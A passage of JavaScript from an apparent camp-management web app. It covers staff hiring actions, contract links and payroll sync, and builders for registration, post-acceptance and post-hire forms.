        if(next)f+='<button class="me-btn me-btn--pri" onclick="CampistryMe.setStaffStatus(\''+je(id)+'\',\''+next+'\')">'+ico('enroll')+'Advance to '+esc(_staffLabel(next))+'</button>';
        f+='<button class="me-btn me-btn--danger" onclick="CampistryMe.setStaffStatus(\''+je(id)+'\',\'declined\')">Decline</button>';
    }
    if(st==='hired')f+='<button class="me-btn me-btn--sec" onclick="CampistryMe.openSendPostHireModal(\''+je(id)+'\')" title="Onboarding logistics and other post-hire details">'+(a.postHire?'✓ ':'')+'Post-Hire Form</button>';
    f+='<button class="me-btn me-btn--ghost-danger" onclick="CampistryMe.deleteStaffApp(\''+je(id)+'\')">'+ico('rescind')+'Delete</button>';
    f+='<button class="me-btn me-btn--sec" onclick="CampistryMe.closeModal(\'appViewModal\')">Close</button>';
    document.getElementById('avFooter').innerHTML=f;

    openModal('appViewModal');
}
// The link a candidate opens on their OWN device to review and accept a
// contract — campId+applicant id are both in the URL (not resolved from
// the recipient's local session, since they may have never opened this
// app before) so campistry_contract.html can look the offer up directly
// with the public anon key, same anon-write posture as camp_state_kv
// already has for the registration/staff-application forms.
function _staffContractLink(id){
    return window.location.origin+'/campistry_contract.html?camp='+encodeURIComponent(getCampId())+'&id='+encodeURIComponent(id);
}
function copyStaffContractLink(id){
    var url=_staffContractLink(id);
    if(navigator.clipboard){navigator.clipboard.writeText(url).then(function(){toast('Contract link copied')});}
    else{prompt('Copy this link and send it to the candidate:',url);}
}
function openStaffContractModal(id){
    var a=staffApplications[id]; if(!a)return;
    var core=PC(); if(!core){toast('Payroll isn\'t available yet','error');return;}
    var ctr=a.contract||{};
    var h='<div class="fg"><label class="fl">Position</label><input class="fi" id="scPosition" value="'+esc(ctr.position||(a.positions||[]).join(', '))+'"></div>';
    h+='<div class="fr"><div class="fg"><label class="fl">Pay Type</label><select id="scPayType" class="fs" onchange="CampistryMe.scPayTypeHint()">'+
        core.PAY_TYPES.map(function(p){return '<option value="'+esc(p.id)+'"'+((ctr.payType||'hourly')===p.id?' selected':'')+'>'+esc(p.label)+'</option>'}).join('')+
        '</select></div><div class="fg"><label class="fl" id="scRateLbl">Rate</label><input type="number" min="0" step="0.01" id="scRate" class="fi" value="'+(ctr.payRate||'')+'"></div></div>';
    h+='<div class="fr">'+ff('Start Date','scStart',ctr.startDate||'','date')+ff('End Date','scEnd',ctr.endDate||'','date')+'</div>';
    h+='<div class="fg"><label class="fl">Terms</label><textarea id="scTerms" class="fi" style="min-height:90px;resize:vertical" placeholder="Duties, housing, time off, anything else the offer should spell out…">'+(ctr.terms?esc(ctr.terms):'')+'</textarea></div>';
    h+='<p style="font-size:.72rem;color:var(--s400);margin-top:-4px">Saving generates a link the candidate opens to review these terms and accept by typing their name — no account needed on their end.</p>';
    showModal(ctr.position?'Edit Contract':'Set Up Contract',h,function(){ saveStaffContract(id); });
    setTimeout(function(){var el=document.getElementById('scRateLbl');if(el){var t=core.PAY_TYPES.filter(function(p){return p.id===(ctr.payType||'hourly')})[0];el.textContent=t?t.rateLabel:'Rate';}},0);
}
function scPayTypeHint(){
    var core=PC(); if(!core)return;
    var sel=document.getElementById('scPayType'), lbl=document.getElementById('scRateLbl');
    if(!sel||!lbl)return;
    var t=core.PAY_TYPES.filter(function(p){return p.id===sel.value})[0];
    lbl.textContent=t?t.rateLabel:'Rate';
}
function saveStaffContract(id){
    var a=staffApplications[id]; if(!a)return;
    function v(fid){var e=document.getElementById(fid);return e?(e.value||'').trim():''}
    var position=v('scPosition');
    if(!position){toast('Enter a position','error');return;}
    var ctr=a.contract||{status:'none'};
    ctr.position=position;
    ctr.payType=v('scPayType')||'hourly';
    ctr.payRate=parseFloat(v('scRate'))||0;
    ctr.startDate=v('scStart');
    ctr.endDate=v('scEnd');
    ctr.terms=v('scTerms');
    if(ctr.status!=='accepted'){
        ctr.status='sent';
        ctr.sentAt=new Date().toISOString();
    }
    a.contract=ctr;
    save();
    closeModal('dynModal');
    viewStaffApp(id);
    copyStaffContractLink(id);
}
// Runs on every Hiring page render — picks up contracts a candidate accepted
// since the last render (accepted via campistry_contract.html, so this admin
// session only learns about it on the next cloud sync/reload, not live) and
// finishes the loop: writes the agreed pay into payroll.staff (creating a
// record if this hire never had one) and checks off the existing "Signed
// offer / contract" onboarding item, which used to be a manually-ticked box
// with nothing behind it. Idempotent via contract.syncedToPayroll.
function _syncAcceptedContractsToPayroll(){
    var changed=false;
    Object.values(staffApplications).forEach(function(a){
        var ctr=a.contract;
        if(!ctr||ctr.status!=='accepted'||ctr.syncedToPayroll)return;
        var payFields={payType:ctr.payType||'hourly',payRate:parseFloat(ctr.payRate)||0,startDate:ctr.startDate||'',endDate:ctr.endDate||''};
        var key=_staffJoinKey(a.email,a.name);
        var idx=key?payroll.staff.findIndex(function(s){return _staffJoinKey(s.email,s.name)===key}):-1;
        if(idx>=0){
            Object.assign(payroll.staff[idx],payFields);
        }else{
            payroll.staff.push(Object.assign({
                id:payroll.nextStaffId++,
                name:a.name||((a.first||'')+' '+(a.last||'')),
                email:a.email||'',phone:a.phone||'',role:ctr.position||(a.positions||[]).join(', '),
                employmentType:'seasonal',isCampCounselor:true,
                homeAddress:{},summerAddressSameAsHome:true,summerAddress:{},
                expectedWeeklyHours:0,seasonWeeks:0,paymentMethod:'',
                i9OnFile:false,w4OnFile:false,backgroundCheck:false,
                youthCorps:{enrolled:false}
            },payFields));
        }
        ctr.syncedToPayroll=true;
        if(!a.onboarding)a.onboarding={};
        a.onboarding.contract=true;
        changed=true;
    });
    if(changed)save();
}
// opts.fromRow skips reopening the modal — a row's Advance/Decline button
// should just update the table in place, the same way Registration's row
// actions never pop the Review modal open.
function setStaffStatus(id,status,opts){
    opts=opts||{};
    var a=staffApplications[id]; if(!a)return;
    var prevStatus=a.status;
    a.status=status;
    // Reaching "hired" for the first time assigns a permanent Staff ID —
    // same rule as camperId: sequential, assigned once, never reused or
    // reassigned on a later status change.
    if(status==='hired'&&prevStatus!=='hired'&&!a.staffId){a.staffId=nextStaffId;nextStaffId++;}
    save();
    _refreshPplIfActive();
    if(!opts.fromRow) viewStaffApp(id);
    toast('Moved to '+_staffLabel(status));
    // Reaching "hired" is the acceptance moment — this is what should turn
    // an applicant into someone who can actually log in, not a separate
    // manual step later. Fire-and-forget: creates the camp_users invite row
    // (role 'counselor' — the tier every hired applicant starts at; a
    // separate pass for admin/division-head-level staff is a known follow-up,
    // not built yet) so a Campistry Lite "Create account" signup with this
    // same email links up immediately. Silent on failure/duplicate — this is
    // a background convenience, not something that should block or alarm
    // the office if it can't complete (no email on file yet, etc).
    if(status==='hired'){
        _autoInviteHiredToLite(a);
        // Post-hire form: only fires on the actual transition into "hired"
        // (never re-fires if it's already hired), and only if the camp
        // turned "Send automatically on hire" on in that form's builder —
        // otherwise the office sends it manually from the Review panel.
        if(prevStatus!=='hired'){
            try{
                var phc=getPostHireFormConfig();
                if(phc.autoSend && a.email) _autoSendPostHire(id);
            }catch(ex){}
        }
    }
}
// See setStaffStatus's "hired" branch. Kept separate from
// inviteBunkStaffToLite (which stays as the manual, bunk-staff-scoped
// button) since this one is a quiet background action, not a user-facing
// button with its own loading/error toast.
async function _autoInviteHiredToLite(a){
    var email=String(a.email||'').trim();
    if(!email){console.log('[Me] auto-invite-to-Lite skipped for '+(a.name||'this hire')+': no email on the application yet');return;}
    if(!window.AccessControl||!window.AccessControl.inviteTeamMember){console.warn('[Me] auto-invite-to-Lite skipped for '+email+': AccessControl.inviteTeamMember not available');return;}
    try{
        var result=await window.AccessControl.inviteTeamMember(email,'counselor',[],a.name||'');
        if(result&&result.error){console.log('[Me] auto-invite-to-Lite skipped for '+email+':',result.error);return;}
        console.log('[Me] auto-invited '+email+' to Campistry Lite as counselor on hire');
    }catch(err){console.warn('[Me] auto-invite-to-Lite failed for '+email+':',err.message);}
}
function saveStaffNotes(id){var a=staffApplications[id];if(!a)return;var el=document.getElementById('staffNote');if(el)a.adminNotes=el.value;save();toast('Notes saved');}
function toggleOnboard(id,key){var a=staffApplications[id];if(!a)return;if(!a.onboarding)a.onboarding={};a.onboarding[key]=!a.onboarding[key];save();}
function cycleRef(id,ri){var a=staffApplications[id];if(!a||!a.references||!a.references[ri])return;var r=a.references[ri];r.status=r.status==='received'?'pending':r.status==='requested'?'received':'requested';save();viewStaffApp(id);}
async function deleteStaffApp(id){
    var a=staffApplications[id]; if(!a)return;
    var nm=a.name||((a.first||'')+' '+(a.last||''))||'this applicant';
    var ok=await confirmDialog({
        title:'Delete Applicant?',
        message:'<strong>'+esc(nm)+'</strong> and their application will be permanently removed. This cannot be undone.',
        confirmLabel:'Delete',
        danger:true
    });
    if(!ok)return;
    delete staffApplications[id];
    save();
    closeModal('appViewModal');
    _refreshPplIfActive();
    toast('Applicant deleted');
}
// Maps SFC_FIELD_CATALOG ids to how Manual Entry should render/collect
// them — same rec-mapping pattern as APP_FIELD_MAP for Registration.
// 'resume' is intentionally absent: Manual Entry (the office typing in a
// walk-up applicant) doesn't collect a resume file, same as it never did.
var SAPP_FIELD_MAP={
    first:{},last:{},email:{type:'email'},phone:{type:'tel'},dob:{type:'date'},
    street:{},city:{},state:{},zip:{},photo:{type:'file'},
    availStart:{type:'date'},availEnd:{type:'date'},
    education:{},experience:{type:'textarea'}
};

// Manual Entry mirrors whatever the camp has configured in Customize Staff
// Form — same sections/order/labels/required-ness as addApplication() does
// for Registration, so office staff seed exactly what applicants see on
// the real form instead of a fixed 5-field shortcut that can drift out of
// sync with it.
function addStaffApp(){
    var sfc=getStaffFormConfig();
    var order=(sfc.sectionOrder&&sfc.sectionOrder.length)?sfc.sectionOrder:SFC_SECTIONS.map(function(s){return s.key});
    var secEnabled={};
    SFC_SECTIONS.forEach(function(s){ secEnabled[s.key]=sfc.sections&&sfc.sections[s.key]?sfc.sections[s.key].enabled:s.default; });
    var positions=(sfc.positions&&sfc.positions.length)?sfc.positions:SFC_POSITIONS_DEFAULT;

    function fieldHtml(f){
        if(f.id==='resume')return '';
        var cfg=(sfc.fields&&sfc.fields[f.id])||{};
        if(cfg.enabled===false)return '';
        var map=SAPP_FIELD_MAP[f.id]||{};
        var label=cfg.label||f.label;
        var req=cfg.required!=null?cfg.required:!!f.required;
        var id='sapp_'+f.id;
        var star=req?' <span class="rq" style="color:var(--err)">*</span>':'';
        if(map.type==='textarea')return '<div class="fg"><label class="fl">'+esc(label)+star+'</label><textarea id="'+id+'" class="fi" style="min-height:50px;resize:vertical"></textarea></div>';
        if(map.type==='file')return '<div class="fg"><label class="fl">'+esc(label)+star+'</label>'
            +'<input type="hidden" id="'+id+'">'
            +'<div style="display:flex;align-items:center;gap:10px">'
            +'<img id="'+id+'_prev" src="" style="display:none;width:48px;height:48px;object-fit:cover;border-radius:8px;border:1px solid var(--s200);flex-shrink:0">'
            +'<input type="file" accept="image/*" class="fi" style="padding:6px 8px" onchange="CampistryMe._onAppPhotoPick(this,\''+id+'\')">'
            +'</div></div>';
        return '<div class="fg"><label class="fl">'+esc(label)+star+'</label><input type="'+(map.type||'text')+'" id="'+id+'" class="fi"></div>';
    }

    var h='';
    order.forEach(function(sectionKey){
        if(!secEnabled[sectionKey])return;
        if(sectionKey==='role'){
            // Position(s) is a chip checklist, not a plain catalog field.
            h+='<div class="fsec">Role &amp; Availability</div>';
            h+='<div class="fg"><label class="fl">Position(s)<span class="rq" style="color:var(--err)">*</span></label><div style="display:flex;flex-wrap:wrap;gap:6px">'
                +positions.map(function(p){return '<label style="display:inline-flex;align-items:center;gap:5px;padding:6px 10px;border:1px solid var(--s200);border-radius:999px;font-size:.8rem;cursor:pointer"><input type="checkbox" class="sappPosCb" value="'+esc(p)+'">'+esc(p)+'</label>';}).join('')
                +'</div></div>';
            var roleRows=(SFC_FIELD_CATALOG.role||[]).map(fieldHtml).filter(Boolean);
            for(var ri=0;ri<roleRows.length;ri+=2){ h+=roleRows[ri+1]?('<div class="fr">'+roleRows[ri]+roleRows[ri+1]+'</div>'):roleRows[ri]; }
            return;
        }
        var catalog=SFC_FIELD_CATALOG[sectionKey];
        if(!catalog)return; // references/consent — office entry doesn't collect these
        var sec=SFC_SECTIONS.filter(function(s){return s.key===sectionKey;})[0];
        var rows=catalog.map(fieldHtml).filter(Boolean);
        if(!rows.length)return;
        h+='<div class="fsec">'+esc(sec.label)+'</div>';
        for(var i=0;i<rows.length;i+=2){
            h+=rows[i+1]?('<div class="fr">'+rows[i]+rows[i+1]+'</div>'):rows[i];
        }
    });

    showModal('Add Applicant',h,function(){
        var values={},missingLabel=null;
        order.forEach(function(sectionKey){
            if(!secEnabled[sectionKey])return;
            var catalog=SFC_FIELD_CATALOG[sectionKey];
            if(!catalog)return;
            catalog.forEach(function(f){
                if(f.id==='resume')return;
                var cfg=(sfc.fields&&sfc.fields[f.id])||{};
                if(cfg.enabled===false)return;
                var el=document.getElementById('sapp_'+f.id);
                if(!el)return;
                var val=(el.value||'').trim();
                values[f.id]=val;
                var req=cfg.required!=null?cfg.required:!!f.required;
                if(req&&!val&&!missingLabel)missingLabel=cfg.label||f.label;
            });
        });
        var positionsChecked=Array.prototype.map.call(document.querySelectorAll('.sappPosCb:checked'),function(c){return c.value;});
        if(secEnabled.role&&!positionsChecked.length&&!missingLabel)missingLabel='Position(s)';
        var first=values.first||'',last=values.last||'';
        if(!first&&!last&&!missingLabel)missingLabel='Name';
        if(missingLabel){toast('Enter: '+missingLabel,'error');return;}

        var id='staff_'+Date.now()+'_'+Math.random().toString(36).slice(2,6);
        staffApplications[id]={
            first:first,last:last,name:(first+' '+last).trim(),
            email:values.email||'',phone:values.phone||'',dob:values.dob||'',
            street:values.street||'',city:values.city||'',state:values.state||'',zip:values.zip||'',photo:values.photo||'',
            positions:positionsChecked,availStart:values.availStart||'',availEnd:values.availEnd||'',
            education:values.education||'',experience:values.experience||'',
            certifications:[],references:[],status:'applied',
            appliedDate:today(),appliedTime:new Date().toISOString(),onboarding:{}
        };
        save();closeModal('dynModal');_refreshPplIfActive();toast('Applicant added');
    },{maxWidth:640});
}
function copyStaffLink(){var url=window.location.origin+'/campistry_staff_apply.html?camp='+encodeURIComponent(getCampId());try{navigator.clipboard&&navigator.clipboard.writeText(url);}catch(e){}toast('Staff application link copied');}
function exportStaffCSV(){
    var rows=[['Name','Email','Phone','Positions','Status','Applied','References received','Notes']];
    Object.values(staffApplications).forEach(function(a){
        var refs=(a.references||[]); var rd=refs.filter(function(r){return r.status==='received';}).length;
        rows.push([a.name||((a.first||'')+' '+(a.last||'')),a.email||'',a.phone||'',(a.positions||[]).join('; '),_staffLabel(a.status||'applied'),a.appliedDate||'',rd+'/'+refs.length,(a.adminNotes||'').replace(/\n/g,' ')]);
    });
    var csv='﻿'+rows.map(function(r){return r.map(function(x){return '"'+String(x==null?'':x).replace(/"/g,'""')+'"';}).join(',');}).join('\n');
    dlFile(csv,'staff-applicants.csv','text/csv');
}


// Rescind a registration: mark the application Withdrawn AND remove the
// camper from the roster (so they drop off the Campers list), cascading the
// removal through families / bunk assignments. The application record stays
// for the audit trail. Frees a session seat → next waitlisted is promoted.
async function rescindEnrollment(id){
    var e=enrollments[id]; if(!e) return;
    var nm=e.camperName||'this camper';
    var ok=await confirmDialog({
        title:'Rescind Registration?',
        message:'<strong>'+esc(nm)+'</strong> will be removed from the Campers list. The application stays here marked <strong>Withdrawn</strong> for the audit trail. This cannot be undone.',
        confirmLabel:'Rescind',
        danger:true
    });
    if(!ok)return;
    if(e.camperName && roster[e.camperName]){ delete roster[e.camperName]; cascadeCamperDelete(e.camperName); }
    var prev=e.status; e.status='withdrawn';
    e.statusHistory=e.statusHistory||[];
    e.statusHistory.push({from:prev,to:'withdrawn',date:new Date().toISOString(),by:'office',rescinded:true});
    if(e.session && prev!=='waitlisted') autoPromoteWaitlist(e.session);
    save(); render(curPage); toast(nm+' rescinded — removed from the Campers list');
}

// ── FORM CUSTOMIZER ───────────────────────────────────────────
// Nothing here is locked — a camp can turn off any section, including
// Camper Info or Signature. `default` just sets the out-of-the-box state;
// applyFormConfig() in campistry_register.html treats a disabled section's
// fields as not-required so turning one off never leaves the form stuck
// asking for something it isn't showing.
var FC_SECTIONS=[
    {key:'camper',label:'Camper Information',desc:'Name, DOB, gender, school, grade, teacher',default:true},
    {key:'parent',label:'Parent / Guardian',desc:'Name, phone, email, second parent',default:true},
    {key:'address',label:'Home Address',desc:'Street, city, state, ZIP',default:true},
    {key:'emergency',label:'Emergency Contact',desc:'Name, relationship, phone',default:true},
    {key:'medical',label:'Medical Information',desc:'Allergies, medications, dietary, notes',default:true},
    {key:'preferences',label:'Preferences',desc:'Bunkmate request, separation, t-shirt, referral source',default:true},
    {key:'documents',label:'Document Uploads',desc:'Immunization records, health forms, insurance',default:true},
    {key:'payment',label:'Payment Preference',desc:'Payment method selection and promo codes',default:true},
    {key:'signature',label:'E-Signature & Agreement',desc:'Waivers, checkboxes, signature capture',default:true},
    {key:'siblings',label:'Sibling Registration',desc:'Allow adding multiple campers in one form',default:true}
];

// Field-level catalog for the ADVANCED tab. Only the plain data-entry sections
// are broken out field-by-field — payment/signature/siblings/documents stay
// section-level toggles (they're structural, not a flat field list). No
// field is locked; `required` only sets the default a camp starts from.
var FC_FIELD_CATALOG={
    camper:[
        {id:'first',label:'Camper First Name',required:true},
        {id:'last',label:'Camper Last Name',required:true},
        {id:'dob',label:'Date of Birth',required:true},
        {id:'gender',label:'Gender'},
        {id:'school',label:'School Name'},
        {id:'schoolGrade',label:'School Grade'},
        {id:'teacher',label:'Teacher'},
        {id:'photo',label:'Camper Photo'}
    ],
    parent:[
        {id:'parentName',label:'Parent / Guardian Name',required:true},
        {id:'parentRelation',label:'Relationship'},
        {id:'parentPhone',label:'Phone',required:true},
        {id:'parentEmail',label:'Email',required:true},
        {id:'parent2Name',label:'Second Parent / Guardian Name'},
        {id:'parent2Relation',label:'Second Parent / Guardian Relationship'},
        {id:'parent2Phone',label:'Second Parent / Guardian Phone'},
        {id:'parent2Email',label:'Second Parent / Guardian Email'}
    ],
    address:[
        {id:'street',label:'Street',required:true},
        {id:'city',label:'City',required:true},
        {id:'state',label:'State'},
        {id:'zip',label:'ZIP',required:true}
    ],
    emergency:[
        {id:'emName',label:'Emergency Contact Name',required:true},
        {id:'emRelation',label:'Relationship'},
        {id:'emPhone',label:'Emergency Phone',required:true}
    ],
    medical:[
        {id:'allergies',label:'Allergies'},
        {id:'medications',label:'Medications'},
        {id:'dietary',label:'Dietary Restrictions'},
        {id:'medicalNotes',label:'Additional Medical Notes'}
    ],
    preferences:[
        {id:'bunkmate',label:'Bunkmate Request'},
        {id:'separate',label:'Separation Request'},
        {id:'shirt',label:'T-Shirt Size'},
        {id:'source',label:'How did you hear about us?'},
        {id:'notes',label:'Additional Notes'}
    ]
};

function getFormConfig(){
    if(formConfig)return formConfig;
    // Default config
    var sections={};
    FC_SECTIONS.forEach(function(s){sections[s.key]={enabled:s.default}});
    return{sections:sections,customQuestions:[],customSections:[],welcomeMessage:'',instructions:'',fields:{},sectionOrder:FC_SECTIONS.map(function(s){return s.key}),branding:{}};
}

// ── POST-ACCEPTANCE FORM ─────────────────────────────────────────────────
// A second, separate form sent AFTER a camper is Accepted — distinct from
// the registration/application form above. Collects choice-style info
// (bunkmate request, session confirmation, t-shirt, transportation, photo
// consent) back into the SAME enrollment record (enrollments[id].postAccept).
// Same "nothing mandatory" philosophy as the registration/staff builders —
// every section and field here is camp-configurable, nothing is locked.
var PAF_SECTIONS=[
    {key:'bunk',label:'Bunk & Session Choices',desc:'Bunkmate request, separation request, session confirmation',default:true},
    {key:'logistics',label:'Logistics',desc:'T-shirt size, transportation',default:true},
    {key:'consent',label:'Photo & Media Consent',desc:'Permission to use photos/video',default:true}
];
var PAF_FIELD_CATALOG={
    bunk:[
        {id:'bunkmate',label:'Bunkmate Request'},
        {id:'separate',label:'Do-Not-Bunk-With Request'},
        {id:'sessionConfirm',label:'Confirm Session'}
    ],
    logistics:[
        {id:'shirt',label:'T-Shirt Size'},
        {id:'transportation',label:'Transportation'}
    ],
    consent:[
        {id:'photoConsent',label:'Photo/Media Permission'}
    ]
};
function getPostAcceptFormConfig(){
    if(paFormConfig)return paFormConfig;
    var sections={};
    PAF_SECTIONS.forEach(function(s){sections[s.key]={enabled:s.default}});
    return{sections:sections,customQuestions:[],customSections:[],welcomeMessage:'',instructions:'',fields:{},sectionOrder:PAF_SECTIONS.map(function(s){return s.key}),branding:{},autoSend:false,attachedListIds:[],printableList:{name:'',items:[]}};
}

// ── POST-HIRE FORM ───────────────────────────────────────────────────────
// A third form, distinct from the Staff Application above — sent AFTER a
// candidate reaches the Hired stage (setStaffStatus(id,'hired')), separate
// from Offer & Contract acceptance (campistry_contract.html), which only
// confirms pay terms — this collects onboarding logistics back into the
// SAME application record (staffApplications[id].postHire). Same "nothing
// mandatory" philosophy as every other builder here — every section and
// field is camp-configurable, nothing is locked.
var PHF_SECTIONS=[
    {key:'logistics',label:'Logistics',desc:'T-shirt size, arrival date, housing preference',default:true},
    {key:'emergency',label:'Emergency Contact',desc:'Who to contact in case of an emergency',default:true},
    {key:'consent',label:'Acknowledgments',desc:'Staff handbook, photo/media permission',default:true}
];
var PHF_FIELD_CATALOG={
    logistics:[
        {id:'shirt',label:'T-Shirt Size'},
        {id:'arrivalDate',label:'Arrival Date'},
        {id:'housing',label:'Housing Preference'}
    ],
    emergency:[
        {id:'emName',label:'Emergency Contact Name'},
        {id:'emRelation',label:'Relationship'},
        {id:'emPhone',label:'Emergency Contact Phone'}
    ],
    consent:[
        {id:'handbookAck',label:'Staff Handbook Acknowledged'},
        {id:'photoConsent',label:'Photo/Media Permission'}
    ]
};
function getPostHireFormConfig(){
    if(phFormConfig)return phFormConfig;
    var sections={};
    PHF_SECTIONS.forEach(function(s){sections[s.key]={enabled:s.default}});
    return{sections:sections,customQuestions:[],customSections:[],welcomeMessage:'',instructions:'',fields:{},sectionOrder:PHF_SECTIONS.map(function(s){return s.key}),branding:{},autoSend:false,handbook:{name:'',data:''},policies:[]};
}

// Lists (packing lists / checklists) live in the Link admin app, stored
// camp-wide under the top-level `link_lists` key (sibling of campistryMe,
// not nested inside it — see campistry_link_admin.html's
// _loadLinkListsStore). Read-only here: the Post-Acceptance builder lets a
// camp pick which existing list(s) to show on the public form; creating/
// editing lists themselves still happens in Link → Lists.
function _getLinkLists(){
    try{
        var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
        return Array.isArray(s.link_lists)?s.link_lists:[];
    }catch(e){ return []; }
}

// Shared by the parent (FC_FIELD_CATALOG) and staff (SFC_FIELD_CATALOG)
// advanced-tab renderers — one field row with Enabled/Required checkboxes
// and a relabel input. `locked` fields render checked+disabled so the
// camp can still rename them but can't turn off the fields the record
// depends on.
function _renderAdvFieldRow(prefix,sectionKey,f,cfg){
    cfg=cfg||{};
    var enabled=f.locked?true:(cfg.enabled!==false);
    var required=f.locked?true:(cfg.required!=null?cfg.required:!!f.required);
    var label=cfg.label!=null?cfg.label:f.label;
    var lockAttr=f.locked?' disabled':'';
    return '<div class="'+prefix+'Field" data-section="'+sectionKey+'" data-id="'+f.id+'" style="display:flex;align-items:center;gap:14px;padding:9px 4px;border-bottom:1px solid var(--s100)">'
        +'<input class="fi '+prefix+'FLabel" style="flex:1;font-size:.82rem;padding:6px 10px" value="'+esc(label)+'">'
        +'<label style="display:flex;align-items:center;gap:5px;font-size:.75rem;color:var(--s500);white-space:nowrap;cursor:'+(f.locked?'default':'pointer')+'"><input type="checkbox" class="'+prefix+'FEnabled"'+(enabled?' checked':'')+lockAttr+' style="accent-color:var(--me);width:15px;height:15px">Show</label>'
        +'<label style="display:flex;align-items:center;gap:5px;font-size:.75rem;color:var(--s500);white-space:nowrap;cursor:'+(f.locked?'default':'pointer')+'"><input type="checkbox" class="'+prefix+'FRequired"'+(required?' checked':'')+lockAttr+' style="accent-color:var(--me);width:15px;height:15px">Required</label>'
        +(f.locked?'<span style="font-size:.68rem;color:var(--s400);white-space:nowrap">🔒</span>':'<span style="width:14px"></span>')
        +'</div>';
}
function _readAdvFields(prefix,catalog){
    var fields={};
    Object.keys(catalog).forEach(function(sectionKey){
        catalog[sectionKey].forEach(function(f){
            var row=document.querySelector('.'+prefix+'Field[data-section="'+sectionKey+'"][data-id="'+f.id+'"]');
            if(!row)return;
            var enabled=f.locked?true:!!row.querySelector('.'+prefix+'FEnabled').checked;
            var required=f.locked?true:!!row.querySelector('.'+prefix+'FRequired').checked;
            var label=(row.querySelector('.'+prefix+'FLabel').value||f.label).trim()||f.label;
            fields[f.id]={enabled:enabled,required:required,label:label};
        });
    });
    return fields;
}
// Real drag-and-drop reordering — same native-HTML5-DnD pattern already
// used for camp-structure reordering (_meReorderInit/_meAttachItemDrag),
// so this feels consistent with the rest of the app rather than inventing
// a second drag system.
function _renderSectionOrderList(prefix,sections,order){
    var keys=(order&&order.length)?order.slice():sections.map(function(s){return s.key});
    // Include any section missing from a stale saved order (e.g. after an app update).
    sections.forEach(function(s){ if(keys.indexOf(s.key)<0) keys.push(s.key); });
    var byKey={}; sections.forEach(function(s){byKey[s.key]=s;});
    return '<div id="'+prefix+'OrderList">'+keys.map(function(k){
        var s=byKey[k]; if(!s)return'';
        return '<div class="'+prefix+'OrderRow" data-key="'+k+'" draggable="true" style="display:flex;align-items:center;gap:10px;padding:9px 10px;border:1px solid var(--s200);border-radius:8px;margin-bottom:5px;background:#fff;cursor:grab">'
            +'<span style="color:var(--s300);font-size:.95rem;line-height:1;letter-spacing:-1px">⠿⠿</span>'
            +'<span style="flex:1;font-size:.83rem;font-weight:600;color:var(--s700)">'+esc(s.label)+'</span>'
            +'</div>';
    }).join('')+'</div>';
}
// Wires the drag handlers onto a rendered order list — must run after the
// HTML above is actually in the DOM (dragover listener lives on the
// container; each row needs draggable dragstart/dragend wiring).
function _initOrderDrag(prefix){
    var list=document.getElementById(prefix+'OrderList');
    if(!list)return;
    _meReorderInit(list,'.'+prefix+'OrderRow');
    list.querySelectorAll('.'+prefix+'OrderRow').forEach(function(row){ _meAttachItemDrag(row); });
}
function _readSectionOrder(prefix){
    return Array.prototype.map.call(document.querySelectorAll('.'+prefix+'OrderRow'),function(r){return r.dataset.key;});
}

// ═══════════════════════════════════════════════════════════════
// FORM BUILDER — split view: settings on the left (#fbPanel, built by
// _buildFcPanelHtml/_buildSfcPanelHtml), a live iframe of the actual public
// form on the right. Every edit in the panel — typing, a checkbox, a drag
// reorder — pushes the current draft config into the iframe via
// postMessage, so the preview updates in real time without ever writing
// the draft to localStorage (nothing is saved until Save is clicked).
// ═══════════════════════════════════════════════════════════════
var _fbKind=null;        // 'registration' | 'staff' | 'postaccept' — which form is open
var _fbPushTimer=null;
var _fbMsgListenerInstalled=false;
var _fbPreviewWin=null;  // full-tab live preview opened via the header's Preview button

// Reads the same DOM the old modal's Save button read — one source of
// truth shared by the live-preview pusher and the real Save.
function _collectFormConfigDraft(){
    var sections={};
    document.querySelectorAll('.fcSec').forEach(function(cb){sections[cb.dataset.key]={enabled:cb.checked}});
    var documents=[];
    document.querySelectorAll('.fcDoc').forEach(function(el){
        var name=(el.querySelector('.fcDocName')?.value||'').trim();
        if(!name)return;
        var maxFiles=parseInt(el.querySelector('.fcDocMax')?.value,10)||1;
        documents.push({name:name,maxFiles:Math.max(1,Math.min(20,maxFiles))});
    });
    return {
        sections:sections,
        customQuestions:_readCustomQuestions('fc'),
        customSections:_readCustomSections('fc'),
        documents:documents,
        welcomeMessage:(document.getElementById('fcWelcome')?.value||'').trim(),
        instructions:(document.getElementById('fcInstructions')?.value||'').trim(),
        fields:_readAdvFields('fc',FC_FIELD_CATALOG),
        sectionOrder:_readSectionOrder('fc'),
        branding:{
            logo:(document.getElementById('fcLogoData')?.value||''),
            color:(document.getElementById('fcAccentColor')?.value||'')
        }
    };
}
function _collectStaffFormConfigDraft(){
    var sections={};
    document.querySelectorAll('.sfcSec').forEach(function(cb){sections[cb.dataset.key]={enabled:cb.checked}});
    var positions=_readChipList('sfcPos'); if(!positions.length)positions=SFC_POSITIONS_DEFAULT.slice();
    var certifications=_readChipList('sfcCert'); if(!certifications.length)certifications=SFC_CERTS_DEFAULT.slice();
    return {
        sections:sections,
        customQuestions:_readCustomQuestions('sfc'),
        customSections:_readCustomSections('sfc'),
        welcomeMessage:(document.getElementById('sfcWelcome')?.value||'').trim(),
        instructions:(document.getElementById('sfcInstructions')?.value||'').trim(),
        positions:positions,
        certifications:certifications,
        fields:_readAdvFields('sfc',SFC_FIELD_CATALOG),
        sectionOrder:_readSectionOrder('sfc'),
        branding:{
            logo:(document.getElementById('sfcLogoData')?.value||''),
            color:(document.getElementById('sfcAccentColor')?.value||'')
        }
    };
}
// Reads the same DOM the Post-Acceptance builder's Save button reads.
function _collectPostAcceptFormConfigDraft(){
    var sections={};
    document.querySelectorAll('.pafSec').forEach(function(cb){sections[cb.dataset.key]={enabled:cb.checked}});
    return {
        sections:sections,
        customQuestions:_readCustomQuestions('paf'),
        customSections:_readCustomSections('paf'),
        welcomeMessage:(document.getElementById('pafWelcome')?.value||'').trim(),
        instructions:(document.getElementById('pafInstructions')?.value||'').trim(),
        fields:_readAdvFields('paf',PAF_FIELD_CATALOG),
        sectionOrder:_readSectionOrder('paf'),
        autoSend:!!(document.getElementById('pafAutoSend')&&document.getElementById('pafAutoSend').checked),
        attachedListIds:Array.prototype.map.call(document.querySelectorAll('.pafListAttach:checked'),function(cb){return cb.value;}),
        printableList:{
            name:(document.getElementById('pafPkName')?.value||'').trim(),
            items:(document.getElementById('pafPkItems')?.value||'').split('\n').map(function(s){return s.trim();}).filter(Boolean)
        },
        branding:{
            logo:(document.getElementById('pafLogoData')?.value||''),
